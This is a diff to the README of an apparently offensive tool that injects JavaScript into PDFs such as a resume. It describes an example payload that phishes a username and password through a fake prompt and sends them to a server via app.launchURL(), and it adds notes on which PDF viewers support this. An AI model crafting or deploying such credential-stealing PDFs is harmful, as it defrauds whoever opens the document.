@@ -38,7 +38,10 @@ python3 coffin-injector.py -i Resume.pdf -o poc.pdf -p 'var u=app.response("This
 
 This example payload prompts the user for their username and password using `app.response()` (an Acrobat JavaScript method). The password is masked and then displayed back to the user in an alert to appear more trustworthy. Finally, the payload sends the credentials via `app.launchURL()` to a specified server.
 
-> Note: This payload relies on Adobe Acrobat features. Some browser-based PDF viewers or restrictive readers may not support it.
+> **Note**: Basic payloads using `app.alert()` and `app.response()` have been tested and are functional in Chromium-based and Firefox browsers (native PDF viewer). However, more advanced functionality such as `app.launchURL()` is only supported and tested in Adobe Acrobat.
+
+For a full list of supported JavaScript functions in PDF files, see Adobe’s official documentation:
+[https://opensource.adobe.com/dc-acrobat-sdk-docs/library/jsapiref/index.html](https://opensource.adobe.com/dc-acrobat-sdk-docs/library/jsapiref/index.html)
 
 ## 📁 Arguments
 
